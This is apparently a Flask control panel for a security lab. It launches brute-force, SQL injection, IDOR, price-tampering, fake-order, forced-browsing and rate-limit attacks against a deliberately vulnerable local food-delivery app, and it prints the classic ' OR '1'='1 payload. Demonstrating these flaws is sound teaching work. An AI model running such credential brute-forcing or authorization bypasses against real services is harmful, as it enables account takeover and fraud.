from flask import Flask, render_template, jsonify, redirect, url_for, request
import requests
import threading
import time
import uuid

app = Flask(__name__)
TARGET = "http://127.0.0.1:5000"
BRUTE_JOBS = {}
BRUTE_LOCK = threading.Lock()

ATTACKS = [
    ("brute", "Brute force", "Try every four-digit combination until the restaurant account accepts one."),
    ("sqli", "SQL injection", "Send a classic SQL injection string to the vulnerable login simulation."),
    ("idor", "IDOR", "Request another customer's order by changing the object ID."),
    ("menu", "Menu tampering", "Change a restaurant menu price without a restaurant login."),
    ("fake_order", "Fake order", "Create an order through an API without signing in."),
    ("privilege", "Privilege escalation", "Open the exposed restaurant administration area without authorization."),
    ("api", "API abuse", "Send a small controlled burst and watch the target rate limiter respond."),
]

def get(path, **kwargs):
    return requests.get(TARGET + path, timeout=3, **kwargs)

def post(path, **kwargs):
    return requests.post(TARGET + path, timeout=3, **kwargs)

def brute_worker(job_id):
    session = requests.Session()
    total = 10000
    with BRUTE_LOCK:
        BRUTE_JOBS[job_id].update({
            "status": "running",
            "attempts": 0,
            "total": total,
            "current": "0000",
            "message": "Starting enumeration from 0000...",
        })

    try:
        for number in range(total):
            candidate = f"{number:04d}"
            try:
                r = session.post(
                    TARGET + "/login",
                    data={"username": "restaurant", "password": candidate},
                    timeout=3,
                    allow_redirects=False,
                )
            except requests.RequestException as exc:
                with BRUTE_LOCK:
                    BRUTE_JOBS[job_id].update({
                        "status": "error",
                        "message": f"Target connection failed: {exc}",
                    })
                return

            attempts = number + 1
            accepted = r.status_code in (301, 302) and r.headers.get("Location") == "/dashboard"

            with BRUTE_LOCK:
                BRUTE_JOBS[job_id].update({
                    "attempts": attempts,
                    "current": candidate,
                    "last_status": r.status_code,
                    "message": f"Tried {candidate}  →  login {'ACCEPTED' if accepted else 'rejected'}",
                })

            if accepted:
                hand = post(
                    "/lab/handoff",
                    data={"username": "restaurant", "password": candidate},
                )
                if hand.status_code == 200:
                    browser_url = f"{TARGET}/lab/open/{hand.text}"
                else:
                    browser_url = TARGET + "/restaurant"

                with BRUTE_LOCK:
                    BRUTE_JOBS[job_id].update({
                        "status": "success",
                        "message": f"MATCH FOUND: {candidate} accepted. Restaurant access unlocked.",
                        "url": browser_url,
                        "title": "Password cracked",
                    })
                return
            time.sleep(0.002)

        with BRUTE_LOCK:
            BRUTE_JOBS[job_id].update({
                "status": "failed",
                "message": "All 10,000 combinations were tried. No match found.",
                "title": "Not cracked",
            })
    except Exception as exc:
        with BRUTE_LOCK:
            BRUTE_JOBS[job_id].update({
                "status": "error",
                "message": f"Attack stopped: {exc}",
            })


def sqli():
    payload = "' OR '1'='1"
    r = post("/lab/sql-login", data={"username": payload, "password": "x"})
    ok = r.status_code == 200 and "SQL injection accepted" in r.text
    import re
    match = re.search(r'href="(/lab/open/[^"]+)"', r.text)
    browser_url = None
    if ok and match:
        path = match.group(1)
        browser_url = TARGET + path if path.startswith("/") else path

    return {
        "ok": ok,
        "title": "Restaurant access granted by SQL injection" if ok else "SQL injection failed",
        "message": "The injected condition bypassed the vulnerable login check. Opening the target now uses a one-time restaurant session handoff.",
        "count": 1,
        "url": browser_url,
    }

def idor():
    r = get("/orders/1002")
    return {
        "ok": r.status_code == 200,
        "title": "Order exposed",
        "message": "Order 1002 was opened without checking whether the logged-in customer owns it.",
        "count": 1,
        "url": TARGET + "/orders/1002",
    }


def menu_tamper(item_id=1, price=5):
    r = post("/lab/menu/update", data={"item_id": item_id, "price": price})
    return {
        "ok": r.status_code == 200,
        "title": "Menu price changed",
        "message": f"Unauthorized price update sent for item {item_id}. New price: ₹{price}.",
        "count": 1,
        "url": TARGET + "/",
    }


def fake_order(item_id=2, quantity=3):
    r = post("/lab/order", data={"item_id": item_id, "quantity": quantity})
    return {
        "ok": r.status_code == 200,
        "title": "Unauthorized order created",
        "message": f"Created an order for item {item_id}, quantity {quantity}, without authentication.",
        "count": 1,
        "url": TARGET + "/",
    }


def privilege():
    r = get("/lab/admin")
    return {
        "ok": r.status_code == 200,
        "title": "Restricted page exposed",
        "message": "The restaurant administration page was reachable without checking the user's role.",
        "count": 1,
        "url": TARGET + "/lab/admin",
    }


def api_abuse():
    statuses = []
    blocked_at = None
    max_requests = 50

    for request_no in range(1, max_requests + 1):
        try:
            r = get(
                "/lab/rate-test",
                params={"lab": "api-abuse"},
                headers={"X-Lab-Attack": "rate-test"},
            )
            statuses.append(r.status_code)
        except requests.RequestException:
            statuses.append("ERR")
            break

        if r.status_code == 429:
            blocked_at = request_no
            break

        time.sleep(0.03)

    blocked = blocked_at is not None
    if blocked:
        message = (
            f"Requests were sent continuously until the target returned "
            f"HTTP 429 on request #{blocked_at}. The attack stopped immediately. "
            f"Results: {statuses}"
        )
    else:
        message = (
            f"The attack sent {len(statuses)} requests but did not receive "
            f"HTTP 429. It stopped at the safety cap of {max_requests} requests. "
            f"Results: {statuses}"
        )

    return {
        "ok": blocked,
        "title": "Rate limit triggered" if blocked else "Rate limit not triggered",
        "message": message,
        "count": len(statuses),
        "url": TARGET + "/security",
    }


@app.route("/")
def home():
    return render_template("home.html", attacks=ATTACKS)


@app.route("/run/brute")
def start_brute():
    job_id = uuid.uuid4().hex
    with BRUTE_LOCK:
        BRUTE_JOBS[job_id] = {
            "status": "starting",
            "attempts": 0,
            "total": 10000,
            "current": "----",
            "last_status": None,
            "message": "Preparing brute-force enumeration...",
            "url": None,
            "title": "Brute-force attack",
        }
    thread = threading.Thread(target=brute_worker, args=(job_id,), daemon=True)
    thread.start()
    return redirect(url_for("brute_progress", job_id=job_id))


@app.route("/brute/<job_id>")
def brute_progress(job_id):
    with BRUTE_LOCK:
        if job_id not in BRUTE_JOBS:
            return "Unknown brute-force job", 404
    return render_template("brute.html", job_id=job_id)


@app.route("/brute/status/<job_id>")
def brute_status(job_id):
    with BRUTE_LOCK:
        job = BRUTE_JOBS.get(job_id)
        if not job:
            return jsonify({"status": "error", "message": "Unknown job"}), 404
        return jsonify(dict(job))


@app.route("/run/<attack>")
def run_attack(attack):
    if attack == "brute":
        return start_brute()

    try:
        if attack == "sqli":
            result = sqli()
        elif attack == "idor":
            result = idor()
        elif attack == "menu":
            item_id = max(1, int(request.args.get("item_id", 1)))
            price = max(0, int(request.args.get("price", 5)))
            result = menu_tamper(item_id, price)
        elif attack == "fake_order":
            item_id = max(1, int(request.args.get("item_id", 2)))
            quantity = max(1, int(request.args.get("quantity", 3)))
            result = fake_order(item_id, quantity)
        elif attack == "privilege":
            result = privilege()
        elif attack == "api":
            result = api_abuse()
        else:
            return "Unknown attack", 404
    except requests.RequestException:
        result = {
            "ok": False,
            "title": "Target is not running",
            "message": "Start the food_delivery application on port 5000 first.",
            "count": 0,
        }

    methods = {
        "sqli": "SQL injection / authentication bypass",
        "idor": "IDOR (Insecure Direct Object Reference)",
        "menu": "Parameter tampering / broken authorization",
        "fake_order": "API abuse / broken authorization",
        "privilege": "Privilege escalation / forced browsing",
        "api": "Rate-limit bypass / API abuse",
    }
    result["method"] = methods.get(attack, "Controlled attack simulation")
    return render_template("result.html", result=result, target=TARGET)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5001, debug=True, threaded=True)
